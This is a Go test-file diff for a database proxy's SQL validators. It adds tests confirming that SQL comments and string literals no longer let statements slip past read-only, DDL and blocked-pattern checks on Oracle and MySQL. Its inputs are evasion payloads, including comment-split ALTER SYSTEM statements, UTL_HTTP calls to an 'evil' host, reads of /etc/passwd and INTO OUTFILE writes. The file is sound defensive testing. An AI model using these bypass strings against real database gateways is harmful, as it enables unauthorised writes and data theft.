@@ -66,11 +66,16 @@ func TestValidateQuery_CaseInsensitive(t *testing.T) {
 	require.Error(t, ValidateQuery("  INSERT INTO t VALUES (1)  ", grant))
 }
 
+// TestValidateQuery_CommentBypass used to pin the *bug*: a leading comment made
+// the prefix classification read the statement as something other than an
+// INSERT, while the database read it as an INSERT. It now pins the fix.
 func TestValidateQuery_CommentBypass(t *testing.T) {
 	t.Parallel()
 
 	grant := &store.Grant{Definition: &store.GrantDefinition{Controls: []string{store.ControlReadOnly}}}
-	assert.NoError(t, ValidateQuery("/* harmless */ INSERT INTO t VALUES (1)", grant))
+	assert.ErrorIs(t,
+		ValidateQuery("/* harmless */ INSERT INTO t VALUES (1)", grant),
+		ErrReadOnlyViolation)
 }
 
 func TestValidateQuery_PasswordChange(t *testing.T) {
@@ -398,6 +403,365 @@ func TestValidateOracleQuery_BlocksAlterSessionContainer(t *testing.T) {
 		require.ErrorIs(t, ValidateOracleQuery(sql, readOnly), ErrReadOnlyViolation, "read_only: %s", sql)
 		require.ErrorIs(t, ValidateOracleQuery(sql, blockDDL), ErrDDLBlocked, "block_ddl: %s", sql)
 	}
+}
+
+// TestValidateOracleQuery_CommentsDoNotEvadePatterns pins the class-wide hole
+// the scratch-copy normalisation closes: every entry in oracleBlockedPatterns
+// is multi-keyword, and Oracle ignores a comment wherever whitespace is
+// allowed, so `ALTER/**/SESSION SET CONTAINER=PDB2` used to walk straight
+// through an outright block.
+//
+// The grant carries no controls, so the only thing that can refuse these is the
+// pattern list itself.
+func TestValidateOracleQuery_CommentsDoNotEvadePatterns(t *testing.T) {
+	t.Parallel()
+
+	grant := &store.Grant{Definition: &store.GrantDefinition{}}
+	blocked := []struct{ sql, reason string }{
+		{"ALTER SESSION /* x */ SET CONTAINER=PDB2", "comment between the keywords"},
+		{"ALTER/**/SESSION SET CONTAINER=PDB2", "empty comment as the only separator"},
+		{"ALTER/**/SYSTEM FLUSH SHARED_POOL", "ALTER SYSTEM, same trick"},
+		{"CREATE/**/DATABASE/**/LINK l CONNECT TO u IDENTIFIED BY p USING 't'", "three keywords, two comments"},
+		{"ALTER SESSION -- pick a pdb\n SET CONTAINER=PDB2", "line comment, not block"},
+		{"ALTER SESSION SET/*x*/CONTAINER/*y*/=/*z*/PDB2", "comments around the parameter and its ="},
+		{"alter/**/session/**/set/**/container=pdb2", "same, lower case"},
+		// Fails closed: the stripper cannot read an unterminated literal, so the
+		// matchers run against the raw text rather than against a statement
+		// nothing checked.
+		{"SELECT 'unterminated /* ALTER SYSTEM */", "un-normalisable input falls back to the raw text"},
+	}
+
+	for _, tt := range blocked {
+		t.Run(tt.reason, func(t *testing.T) {
+			t.Parallel()
+			assert.ErrorIs(t, ValidateOracleQuery(tt.sql, grant), ErrOraclePatternBlocked)
+		})
+	}
+}
+
+// TestValidateQuery_CommentsDoNotEvadeClassification is the other half: the
+// read_only / block_ddl classification is prefix-shaped, so a leading comment
+// changed what a statement looked like to dbbat but not to the database.
+func TestValidateQuery_CommentsDoNotEvadeClassification(t *testing.T) {
+	t.Parallel()
+
+	readOnly := &store.Grant{Definition: &store.GrantDefinition{Controls: []string{store.ControlReadOnly}}}
+	blockDDL := &store.Grant{Definition: &store.GrantDefinition{Controls: []string{store.ControlBlockDDL}}}
+	noControls := &store.Grant{Definition: &store.GrantDefinition{}}
+
+	writes := []string{
+		"/*x*/INSERT INTO t VALUES (1)",
+		"/* leading */ UPDATE t SET x = 1",
+		"-- leading\nDELETE FROM t",
+		"/*a*//*b*/ MERGE INTO t USING s ON (t.id = s.id) WHEN MATCHED THEN UPDATE SET t.x = s.x",
+	}
+	for _, sql := range writes {
+		require.ErrorIs(t, ValidateQuery(sql, readOnly), ErrReadOnlyViolation, "write: %s", sql)
+	}
+
+	ddl := []string{
+		"/*x*/DROP TABLE t",
+		"-- comment\n\tCREATE TABLE t (id NUMBER)",
+	}
+	for _, sql := range ddl {
+		require.ErrorIs(t, ValidateQuery(sql, blockDDL), ErrDDLBlocked, "ddl: %s", sql)
+	}
+
+	// Password changes are prefix-shaped too.
+	require.ErrorIs(t,
+		ValidateQuery("/*x*/ALTER USER bob PASSWORD 'secret'", noControls),
+		ErrPasswordChangeBlocked)
+	require.ErrorIs(t,
+		ValidateQuery("ALTER/**/USER bob PASSWORD 'secret'", noControls),
+		ErrPasswordChangeBlocked)
+}
+
+// TestValidateQuery_HintsStayAllowed is why the normalised form is a scratch
+// copy and never what gets relayed: an optimizer hint *is* a comment. Stripping
+// it from the matching copy must not turn a SELECT into anything else, and the
+// caller's own string is what reaches the database.
+func TestValidateQuery_HintsStayAllowed(t *testing.T) {
+	t.Parallel()
+
+	readOnly := &store.Grant{Definition: &store.GrantDefinition{Controls: []string{store.ControlReadOnly}}}
+	allowed := []string{
+		"SELECT /*+ INDEX(t i) */ * FROM t",
+		"/*+ ALL_ROWS */ SELECT * FROM t",
+		"SELECT * FROM t -- trailing note",
+		"SELECT * FROM t /* trailing note */",
+	}
+
+	for _, sql := range allowed {
+		before := sql
+
+		require.NoError(t, ValidateQuery(sql, readOnly), "should allow: %s", sql)
+		require.NoError(t, ValidateOracleQuery(sql, readOnly), "should allow: %s", sql)
+		// The validators only ever read: the bytes the caller goes on to relay are
+		// the bytes it passed in.
+		require.Equal(t, before, sql)
+	}
+}
+
+// TestMatchableSQL_LiteralAware is the part the spec calls out as the one to
+// test hardest: a `/*` or `--` inside a literal is not a comment, and mistaking
+// one for a comment deletes real SQL from the copy the matchers see — a parser
+// bug that becomes an authorization bug.
+func TestMatchableSQL_LiteralAware(t *testing.T) {
+	t.Parallel()
+
+	cases := []struct {
+		name   string
+		syntax sqlCommentSyntax
+		in     string
+		want   string
+	}{
+		{
+			name:   "block comment inside a literal is not a comment",
+			syntax: syntaxStandard,
+			in:     `SELECT * FROM t WHERE c = '/*' AND d = 1`,
+			want:   `SELECT * FROM t WHERE c = '/*' AND d = 1`,
+		},
+		{
+			name:   "line comment inside a literal is not a comment",
+			syntax: syntaxStandard,
+			in:     `SELECT * FROM t WHERE c = '-- not a comment' AND d = 1`,
+			want:   `SELECT * FROM t WHERE c = '-- not a comment' AND d = 1`,
+		},
+		{
+			name:   "doubled quote does not end the literal",
+			syntax: syntaxStandard,
+			in:     `SELECT 'it''s /* fine' FROM dual`,
+			want:   `SELECT 'it''s /* fine' FROM dual`,
+		},
+		{
+			name:   "quoted identifier shields a comment introducer",
+			syntax: syntaxStandard,
+			in:     `SELECT "co/*l" FROM t`,
+			want:   `SELECT "co/*l" FROM t`,
+		},
+		{
+			name:   "q-quote operator, bracket form",
+			syntax: syntaxStandard,
+			in:     `SELECT q'[it's /* fine]' FROM dual`,
+			want:   `SELECT q'[it's /* fine]' FROM dual`,
+		},
+		{
+			name:   "q-quote operator, brace form",
+			syntax: syntaxStandard,
+			in:     `SELECT q'{a -- b}' FROM dual`,
+			want:   `SELECT q'{a -- b}' FROM dual`,
+		},
+		{
+			name:   "q-quote operator, paren form",
+			syntax: syntaxStandard,
+			in:     `SELECT Q'(a /* b)' FROM dual`,
+			want:   `SELECT Q'(a /* b)' FROM dual`,
+		},
+		{
+			name:   "q-quote operator, angle form",
+			syntax: syntaxStandard,
+			in:     `SELECT q'<a -- b>' FROM dual`,
+			want:   `SELECT q'<a -- b>' FROM dual`,
+		},
+		{
+			name:   "q-quote operator, arbitrary delimiter",
+			syntax: syntaxStandard,
+			in:     `SELECT q'!a /* b!' FROM dual`,
+			want:   `SELECT q'!a /* b!' FROM dual`,
+		},
+		{
+			name:   "nq-quote operator",
+			syntax: syntaxStandard,
+			in:     `SELECT nq'[a /* b]' FROM dual`,
+			want:   `SELECT nq'[a /* b]' FROM dual`,
+		},
+		{
+			name:   "a column ending in q is not a quote operator",
+			syntax: syntaxStandard,
+			in:     `SELECT abq'x' /*c*/ FROM t`,
+			want:   `SELECT abq'x'   FROM t`,
+		},
+		{
+			name:   "comments are replaced, not deleted",
+			syntax: syntaxStandard,
+			in:     `ALTER/**/SESSION`,
+			want:   `ALTER SESSION`,
+		},
+		{
+			name:   "unterminated block comment runs to end of input",
+			syntax: syntaxStandard,
+			in:     "SELECT 1 FROM dual /* and then",
+			want:   "SELECT 1 FROM dual  ",
+		},
+		{
+			name:   "line comment keeps its newline",
+			syntax: syntaxStandard,
+			in:     "SELECT 1 -- note\nFROM dual",
+			want:   "SELECT 1  \nFROM dual",
+		},
+		{
+			name:   "unterminated literal falls back to the raw text",
+			syntax: syntaxStandard,
+			in:     `SELECT '/*x*/`,
+			want:   `SELECT '/*x*/`,
+		},
+		{
+			name:   "no comment introducer at all is returned untouched",
+			syntax: syntaxStandard,
+			in:     `SELECT * FROM t WHERE a = 'b'`,
+			want:   `SELECT * FROM t WHERE a = 'b'`,
+		},
+		{
+			name:   "mysql hash comment",
+			syntax: syntaxMySQL,
+			in:     "SELECT 1 # note\nFROM t",
+			want:   "SELECT 1  \nFROM t",
+		},
+		{
+			name:   "mysql hash is not a comment for the other dialects",
+			syntax: syntaxStandard,
+			in:     "SELECT 1 # note\nFROM t",
+			want:   "SELECT 1 # note\nFROM t",
+		},
+		{
+			name:   "mysql requires whitespace after the double dash",
+			syntax: syntaxMySQL,
+			in:     "SELECT 1--2 FROM t",
+			want:   "SELECT 1--2 FROM t",
+		},
+		{
+			name:   "the other dialects do not",
+			syntax: syntaxStandard,
+			in:     "SELECT 1--2 FROM t",
+			want:   "SELECT 1 ",
+		},
+		{
+			name:   "mysql backslash escape does not end the literal",
+			syntax: syntaxMySQL,
+			in:     `SELECT '\'' /*c*/ FROM t`,
+			want:   `SELECT '\''   FROM t`,
+		},
+		{
+			name:   "mysql backtick identifier shields a comment introducer",
+			syntax: syntaxMySQL,
+			in:     "SELECT `co/*l` /*c*/ FROM t",
+			want:   "SELECT `co/*l`   FROM t",
+		},
+		{
+			name:   "mysql executable comment keeps its body",
+			syntax: syntaxMySQL,
+			in:     "/*!40101 SET GLOBAL x=1 */",
+			want:   " 40101 SET GLOBAL x=1 */",
+		},
+		{
+			name:   "mariadb executable comment keeps its body",
+			syntax: syntaxMySQL,
+			in:     "/*M!100001 SET GLOBAL x=1 */",
+			want:   " 100001 SET GLOBAL x=1 */",
+		},
+		{
+			name:   "a mysql optimizer hint is a plain comment",
+			syntax: syntaxMySQL,
+			in:     "SELECT /*+ MAX_EXECUTION_TIME(1) */ 1",
+			want:   "SELECT   1",
+		},
+	}
+
+	for _, tt := range cases {
+		t.Run(tt.name, func(t *testing.T) {
+			t.Parallel()
+			assert.Equal(t, tt.want, matchableSQL(tt.in, tt.syntax))
+		})
+	}
+}
+
+// TestValidateOracleQuery_LiteralsKeepLaterCodeVisible is the literal-awareness
+// property stated as the thing that actually matters: a naive stripper reading
+// the `/*` inside `'/*'` as a comment would delete the rest of the statement
+// from the matching copy, and with it the UTL_HTTP call that must be blocked.
+func TestValidateOracleQuery_LiteralsKeepLaterCodeVisible(t *testing.T) {
+	t.Parallel()
+
+	grant := &store.Grant{Definition: &store.GrantDefinition{}}
+	blocked := []string{
+		`SELECT * FROM t WHERE c = '/*' AND d = UTL_HTTP.REQUEST('http://evil')`,
+		`SELECT * FROM t WHERE c = '--' AND d = UTL_HTTP.REQUEST('http://evil')`,
+		`SELECT q'[a /* b]', UTL_FILE.FOPEN('/etc/passwd','r') FROM dual`,
+		`SELECT 'it''s /*', DBMS_PIPE.SEND_MESSAGE('p') FROM dual`,
+	}
+
+	for _, sql := range blocked {
+		assert.ErrorIs(t, ValidateOracleQuery(sql, grant), ErrOraclePatternBlocked, "should block: %s", sql)
+	}
+}
+
+// TestValidateMySQLQuery_Comments covers the MySQL comment syntax the shared
+// validators have to know about: `#`, `--` only with whitespace behind it, and
+// `/*! … */`, whose body MySQL *executes* — stripping that one would have made
+// this change the evasion rather than the fix.
+func TestValidateMySQLQuery_Comments(t *testing.T) {
+	t.Parallel()
+
+	grant := &store.Grant{Definition: &store.GrantDefinition{}}
+	blocked := []struct{ sql, reason string }{
+		{"SET/**/GLOBAL max_connections=1", "block comment between the keywords"},
+		{"SET -- note\nGLOBAL max_connections=1", "line comment"},
+		{"SET # note\nGLOBAL max_connections=1", "hash comment"},
+		{"/*!40101 SET GLOBAL max_connections=1 */", "version-gated comment MySQL executes"},
+		{"/*M!100001 SET GLOBAL max_connections=1 */", "MariaDB flavor of the same"},
+		{"LOAD/**/DATA LOCAL INFILE '/etc/passwd' INTO TABLE t", "LOAD DATA INFILE"},
+		{"SELECT * FROM t INTO/**/OUTFILE '/tmp/x'", "INTO OUTFILE"},
+		{"SET/**/PASSWORD = PASSWORD('x')", "SET PASSWORD"},
+		// A `#` inside a literal is not a comment: reading it as one would delete
+		// the rest of the statement from the matching copy, INTO OUTFILE included.
+		{"SELECT * FROM t WHERE c = '#' INTO OUTFILE '/tmp/x'", "hash inside a literal"},
+		{`SELECT * FROM t WHERE c = '-- ' INTO OUTFILE '/tmp/x'`, "double dash inside a literal"},
+	}
+
+	for _, tt := range blocked {
+		t.Run(tt.reason, func(t *testing.T) {
+			t.Parallel()
+			assert.ErrorIs(t, ValidateMySQLQuery(tt.sql, grant), ErrMySQLPatternBlocked)
+		})
+	}
+
+	// A hint is still just a comment, and `--` without whitespace behind it is
+	// not one for MySQL (`1--2` is `1 - (-2)`).
+	allowed := []string{
+		"SELECT /*+ MAX_EXECUTION_TIME(1) */ * FROM t",
+		"SELECT 1--2 FROM t",
+		"SELECT * FROM t # trailing note",
+	}
+	for _, sql := range allowed {
+		assert.NoError(t, ValidateMySQLQuery(sql, grant), "should allow: %s", sql)
+	}
+}
+
+// BenchmarkValidateOracleQuery guards the hot path: this runs on every
+// statement on all five protocols, so the overwhelmingly common comment-free
+// statement must cost a single ContainsAny scan and no allocation.
+func BenchmarkValidateOracleQuery(b *testing.B) {
+	grant := &store.Grant{Definition: &store.GrantDefinition{Controls: []string{store.ControlReadOnly}}}
+
+	b.Run("no_comment", func(b *testing.B) {
+		sql := "SELECT id, name, created_at FROM customers WHERE tenant_id = :1 ORDER BY created_at DESC"
+
+		b.ReportAllocs()
+
+		for range b.N {
+			_ = ValidateOracleQuery(sql, grant)
+		}
+	})
+
+	b.Run("with_comment", func(b *testing.B) {
+		sql := "SELECT /*+ INDEX(customers ix_tenant) */ id, name FROM customers WHERE tenant_id = :1"
+
+		b.ReportAllocs()
+
+		for range b.N {
+			_ = ValidateOracleQuery(sql, grant)
+		}
+	})
 }
 
 // TestValidateOracleQuery_AllowsAlterSessionCurrentSchema is the other half of
